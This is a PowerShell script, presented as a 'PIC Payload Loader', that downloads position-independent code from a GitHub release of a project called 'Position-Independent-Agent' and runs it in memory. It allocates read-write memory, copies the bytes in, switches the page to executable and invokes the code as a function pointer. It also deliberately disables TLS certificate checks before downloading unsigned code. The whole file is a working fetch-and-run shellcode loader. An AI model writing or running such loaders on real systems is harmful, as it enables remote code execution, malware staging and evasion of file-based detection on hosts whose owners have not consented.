<#
.SYNOPSIS
    PIC Payload Loader for Windows (PowerShell)

.DESCRIPTION
    Downloads position-independent code from GitHub Releases and executes
    it in-process via function pointer (VirtualAlloc RW, copy, VirtualProtect RX,
    invoke as delegate). Architecture is auto-detected from the running process.

    Requires PowerShell 2.0+.

.PARAMETER Tag
    GitHub release tag to download. Defaults to "preview".

.EXAMPLE
    # Download latest preview build and run:
    .\loader.ps1

.EXAMPLE
    # Download a specific release:
    .\loader.ps1 -Tag v1.0.0
#>

[CmdletBinding()]
param(
    [Parameter()]
    [string]$Tag
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

# =============================================================================
# Constants
# =============================================================================

$Script:Repo = 'mrzaxaryan/Position-Independent-Agent'
$Script:DefaultTag = 'preview'

# =============================================================================
# Win32 P/Invoke Definitions
# =============================================================================

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public delegate int PayloadEntry();

public static class Win32 {
    public const uint MEM_COMMIT_RESERVE  = 0x00003000;
    public const uint MEM_RELEASE         = 0x00008000;
    public const uint PAGE_READWRITE      = 0x04;
    public const uint PAGE_EXECUTE_READ   = 0x20;

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool VirtualFree(
        IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool VirtualProtect(
        IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static bool ValidateCert(object s,
        System.Security.Cryptography.X509Certificates.X509Certificate c,
        System.Security.Cryptography.X509Certificates.X509Chain ch,
        System.Net.Security.SslPolicyErrors e) { return true; }
}
'@

# =============================================================================
# Logging
# =============================================================================

function Write-Log {
    param(
        [ValidateSet('DBG', 'INF', 'OK', 'WRN', 'ERR')]
        [string]$Level,
        [string]$Message
    )

    $timestamp = Get-Date -Format 'HH:mm:ss'
    if ($Level -eq 'OK') { $prefix = '[INF]' } else { $prefix = "[$Level]" }

    $colors = @{
        'DBG' = 'DarkGray'
        'INF' = 'Cyan'
        'OK'  = 'Green'
        'WRN' = 'Yellow'
        'ERR' = 'Red'
    }

    Write-Host "$prefix [$timestamp] $Message" -ForegroundColor $colors[$Level]
}

function Format-HexDump {
    param([byte[]]$Data, [int]$Count = 32)
    $n = [Math]::Min($Data.Length, $Count)
    $hex = ($Data[0..($n - 1)] | ForEach-Object { '{0:x2}' -f $_ }) -join ' '
    if ($Data.Length -gt $Count) { $hex += ' ...' }
    return $hex
}

# =============================================================================
# Host Detection
# =============================================================================

function Get-HostArch {
    $machine = $env:PROCESSOR_ARCHITECTURE

    # In-process execution: arch must match the PowerShell process bitness.
    # A 32-bit PS on 64-bit Windows reports x86 with PROCESSOR_ARCHITEW6432=AMD64,
    # but we need i386 payload since we run in the 32-bit process itself.
    switch ($machine) {
        'AMD64'   { return 'x86_64'  }
        'x86'     { return 'i386'    }
        'ARM64'   { return 'aarch64' }
        'ARM'     { return 'armv7a'  }
        default   {
            Write-Log 'WRN' "Unknown PROCESSOR_ARCHITECTURE: $machine, defaulting to x86_64"
            return 'x86_64'
        }
    }
}

# =============================================================================
# Download from GitHub Releases
# =============================================================================

function Get-Payload {
    param(
        [string]$TargetArch,
        [string]$ReleaseTag
    )

    if (-not $ReleaseTag) {
        $ReleaseTag = $Script:DefaultTag
        Write-Log 'INF' "No tag specified, using default: $ReleaseTag"
    }

    $asset = "windows-$TargetArch.bin"
    $url = "https://github.com/$($Script:Repo)/releases/download/$ReleaseTag/$asset"

    Write-Log 'INF' "Asset: $asset"
    Write-Log 'INF' "URL:   $url"
    Write-Log 'INF' 'Downloading ...'

    # Disable SSL verification for consistency with the Python loader --
    # we download unsigned payload from public GitHub Releases.
    $prevCallback = [System.Net.ServicePointManager]::ServerCertificateValidationCallback
    try {
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = `
            New-Object System.Net.Security.RemoteCertificateValidationCallback([Win32], 'ValidateCert')
        # TLS 1.2 = 3072; use integer cast because the enum name may not exist on .NET 3.5
        try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]3072 } catch {}

        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add('User-Agent', 'PIA-Loader/1.0')
        $data = $webClient.DownloadData($url)
    }
    catch [System.Net.WebException] {
        $response = $_.Exception.Response
        if ($response -and $response.StatusCode -eq [System.Net.HttpStatusCode]::NotFound) {
            Write-Log 'ERR' "Asset not found (HTTP 404): $asset @ $ReleaseTag"
            Write-Log 'ERR' "URL: $url"
            exit 1
        }
        Write-Log 'ERR' "Download failed: $($_.Exception.Message)"
        exit 1
    }
    finally {
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $prevCallback
    }

    Write-Log 'OK' "Received $($data.Length) bytes"

    # Validate payload
    Write-Log 'INF' "Validating payload ($($data.Length) bytes)"
    Write-Log 'DBG' "Header: $(Format-HexDump $data)"

    if ($data.Length -lt 64) {
        Write-Log 'ERR' "Payload too small ($($data.Length) bytes) -- not valid PIC binary"
        exit 1
    }

    $headerStr = [System.Text.Encoding]::ASCII.GetString($data, 0, [Math]::Min(256, $data.Length))
    if ($headerStr -match '<!DOCTYPE|<html|<HTML') {
        Write-Log 'ERR' 'Payload is HTML, not a valid binary (check network/proxy)'
        exit 1
    }

    Write-Log 'OK' "Payload validated -- $($data.Length) bytes"
    return $data
}

# =============================================================================
# Execution -- In-Process via Function Pointer
# =============================================================================

function Invoke-Payload {
    param([byte[]]$Data)

    $size = New-Object UIntPtr([uint32]$Data.Length)

    Write-Log 'INF' "VirtualAlloc: size=$($Data.Length) protect=PAGE_READWRITE (0x04)"
    $mem = [Win32]::VirtualAlloc(
        [IntPtr]::Zero, $size,
        [Win32]::MEM_COMMIT_RESERVE, [Win32]::PAGE_READWRITE)

    if ($mem -eq [IntPtr]::Zero) {
        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw "VirtualAlloc failed (error=$err)"
    }
    Write-Log 'OK' "VirtualAlloc: addr=0x$($mem.ToString('X'))"

    try {
        Write-Log 'INF' "Copying $($Data.Length) bytes to allocated memory"
        [System.Runtime.InteropServices.Marshal]::Copy($Data, 0, $mem, $Data.Length)
        Write-Log 'OK' 'Memory copy complete'

        Write-Log 'INF' "VirtualProtect: PAGE_READWRITE -> PAGE_EXECUTE_READ (0x20)"
        $oldProtect = [uint32]0
        $result = [Win32]::VirtualProtect($mem, $size, [Win32]::PAGE_EXECUTE_READ, [ref]$oldProtect)
        if (-not $result) {
            $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            throw "VirtualProtect failed (error=$err)"
        }
        Write-Log 'OK' "VirtualProtect: old_protect=0x$($oldProtect.ToString('X2'))"

        Write-Log 'OK' "Entry point: 0x$($mem.ToString('X'))"
        Write-Log 'INF' 'Transferring control to payload ...'

        $entryFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            $mem, [PayloadEntry])
        return $entryFunc.Invoke()
    }
    finally {
        [Win32]::VirtualFree($mem, [UIntPtr]::Zero, [Win32]::MEM_RELEASE) | Out-Null
    }
}

# =============================================================================
# Entry Point
# =============================================================================

function Main {
    $arch = Get-HostArch
    $psBits = [IntPtr]::Size * 8

    Write-Log 'INF' "Host: Windows/$arch/${psBits}bit"
    Write-Log 'INF' "PowerShell: $($PSVersionTable.PSVersion) ($psBits-bit)"
    Write-Log 'DBG' "PROCESSOR_ARCHITECTURE: $env:PROCESSOR_ARCHITECTURE"
    Write-Log 'INF' "Platform: windows  arch: $arch  tag: $(if ($Tag) { $Tag } else { $Script:DefaultTag })"

    $payload = Get-Payload -TargetArch $arch -ReleaseTag $Tag
    Write-Log 'OK' "Payload ready: $($payload.Length) bytes"

    $code = Invoke-Payload -Data $payload

    Write-Log 'OK' "Exit code: $code"
    exit $code
}

Main
